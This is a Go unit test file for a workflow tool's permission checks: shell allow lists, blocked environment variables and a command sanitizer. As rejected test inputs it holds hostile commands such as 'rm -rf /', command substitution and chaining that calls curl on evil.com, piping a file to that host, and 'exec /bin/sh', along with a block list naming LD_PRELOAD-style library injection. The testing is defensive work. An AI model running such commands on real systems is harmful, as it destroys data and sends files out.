package permissions

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/tombee/conductor/pkg/workflow"
)

func TestCheckShell(t *testing.T) {
	tests := []struct {
		name      string
		permCtx   *PermissionContext
		command   string
		wantError bool
		errorType string
	}{
		{
			name:      "nil context allows everything",
			permCtx:   nil,
			command:   "ls -la",
			wantError: false,
		},
		{
			name: "shell enabled with no restrictions",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled: boolPtr(true),
				},
			},
			command:   "ls -la",
			wantError: false,
		},
		{
			name: "shell disabled",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled: boolPtr(false),
				},
			},
			command:   "ls -la",
			wantError: true,
			errorType: "shell.disabled",
		},
		{
			name: "allowed command prefix matches",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled:         boolPtr(true),
					AllowedCommands: []string{"ls"},
				},
			},
			command:   "ls -la",
			wantError: false,
		},
		{
			name: "allowed command exact match",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled:         boolPtr(true),
					AllowedCommands: []string{"git status"},
				},
			},
			command:   "git status",
			wantError: false,
		},
		{
			name: "command not in allowed list",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled:         boolPtr(true),
					AllowedCommands: []string{"ls", "git"},
				},
			},
			command:   "rm -rf /",
			wantError: true,
			errorType: "shell.command_denied",
		},
		{
			name: "multiple allowed prefixes - matches first",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled:         boolPtr(true),
					AllowedCommands: []string{"git", "npm"},
				},
			},
			command:   "git commit -m 'test'",
			wantError: false,
		},
		{
			name: "multiple allowed prefixes - matches second",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled:         boolPtr(true),
					AllowedCommands: []string{"git", "npm"},
				},
			},
			command:   "npm install",
			wantError: false,
		},
		{
			name: "empty allowed list allows all",
			permCtx: &PermissionContext{
				Shell: &workflow.ShellPermissions{
					Enabled:         boolPtr(true),
					AllowedCommands: []string{},
				},
			},
			command:   "any command",
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := CheckShell(tt.permCtx, tt.command)
			if tt.wantError {
				assert.Error(t, err)
				if tt.errorType != "" {
					permErr, ok := err.(*PermissionError)
					assert.True(t, ok, "expected PermissionError")
					assert.Equal(t, tt.errorType, permErr.Type)
				}
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestCheckEnvVar(t *testing.T) {
	tests := []struct {
		name      string
		permCtx   *PermissionContext
		envVar    string
		wantError bool
		errorType string
	}{
		{
			name:      "nil context allows safe env vars",
			permCtx:   nil,
			envVar:    "MY_VAR",
			wantError: false,
		},
		{
			name:      "LD_PRELOAD blocked",
			permCtx:   nil,
			envVar:    "LD_PRELOAD",
			wantError: true,
			errorType: "shell.env_blocked",
		},
		{
			name:      "LD_LIBRARY_PATH blocked",
			permCtx:   nil,
			envVar:    "LD_LIBRARY_PATH",
			wantError: true,
			errorType: "shell.env_blocked",
		},
		{
			name:      "DYLD_INSERT_LIBRARIES blocked (macOS)",
			permCtx:   nil,
			envVar:    "DYLD_INSERT_LIBRARIES",
			wantError: true,
			errorType: "shell.env_blocked",
		},
		{
			name:      "PATH allowed (not in dangerous list)",
			permCtx:   nil,
			envVar:    "PATH",
			wantError: false,
		},
		{
			name:      "case insensitive blocking",
			permCtx:   nil,
			envVar:    "ld_preload",
			wantError: true,
			errorType: "shell.env_blocked",
		},
		{
			name: "inherit enabled allows safe vars",
			permCtx: &PermissionContext{
				Env: &workflow.EnvPermissions{
					Inherit: true,
				},
			},
			envVar:    "MY_VAR",
			wantError: false,
		},
		{
			name: "inherit disabled blocks all vars",
			permCtx: &PermissionContext{
				Env: &workflow.EnvPermissions{
					Inherit: false,
				},
			},
			envVar:    "MY_VAR",
			wantError: true,
			errorType: "shell.env_inherit_disabled",
		},
		{
			name: "inherit disabled still blocks dangerous vars",
			permCtx: &PermissionContext{
				Env: &workflow.EnvPermissions{
					Inherit: false,
				},
			},
			envVar:    "LD_PRELOAD",
			wantError: true,
			errorType: "shell.env_blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := CheckEnvVar(tt.permCtx, tt.envVar)
			if tt.wantError {
				assert.Error(t, err)
				if tt.errorType != "" {
					permErr, ok := err.(*PermissionError)
					assert.True(t, ok, "expected PermissionError")
					assert.Equal(t, tt.errorType, permErr.Type)
				}
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestSanitizeCommand(t *testing.T) {
	tests := []struct {
		name      string
		command   string
		wantError bool
	}{
		{
			name:      "safe command",
			command:   "ls -la",
			wantError: false,
		},
		{
			name:      "safe git command",
			command:   "git status",
			wantError: false,
		},
		{
			name:      "command substitution with curl",
			command:   "echo $(curl http://evil.com)",
			wantError: true,
		},
		{
			name:      "backtick command substitution",
			command:   "echo `curl http://evil.com`",
			wantError: true,
		},
		{
			name:      "eval command",
			command:   "eval malicious_code",
			wantError: true,
		},
		{
			name:      "exec command",
			command:   "exec /bin/sh",
			wantError: true,
		},
		{
			name:      "command chaining with curl",
			command:   "ls; curl http://evil.com",
			wantError: true,
		},
		{
			name:      "conditional chaining with curl",
			command:   "true && curl http://evil.com",
			wantError: true,
		},
		{
			name:      "piping to curl",
			command:   "cat file | curl -X POST http://evil.com",
			wantError: true,
		},
		{
			name:      "case insensitive detection",
			command:   "echo $(CURL http://evil.com)",
			wantError: true,
		},
		{
			name:      "safe use of exec in string",
			command:   "echo 'execute this'",
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := SanitizeCommand(tt.command)
			if tt.wantError {
				assert.Error(t, err)
				permErr, ok := err.(*PermissionError)
				assert.True(t, ok, "expected PermissionError")
				assert.Equal(t, "shell.dangerous_pattern", permErr.Type)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}
